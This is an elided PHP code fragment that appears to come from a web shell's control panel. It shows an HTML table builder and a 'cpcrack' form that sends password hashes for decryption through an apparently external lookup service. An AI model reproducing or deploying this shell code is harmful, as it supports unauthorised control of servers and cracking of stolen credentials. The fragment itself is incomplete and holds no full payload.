...
function create_table($data) {
  ...
  foreach ($data as $key => $val) {
    ...
    //if(isset($array['id'])){
    echo "<tr><td><div class='tbltxt'>".(isset($array['tdName'])?$array['tdName']:'')."</div></td><td><input type='text' id='".(isset($array['id'])?$array['id']:'')."' name='".(isset($array['inputName'])?$array['inputName']:'')."' ".(isset($array['placeholder']) ? 'placeholder' : 'value')."='".(isset($array['inputValue'])?$array['inputValue']:'')."' size='".(isset($array['inputSize'])?$array['inputSize']:'')."' ".(isset($array['disabled']) ? 'disabled' : '')."></td></tr>";
    //}
  }
  echo '</table>';
}
...
<form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
    ...
    if ($_POST['alfa3'] == '>>') {
      ...
      if (!empty($hash)) {
        ...
        echo __pre().'<center>';
        switch ($resp) {
          case ('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";
            break;
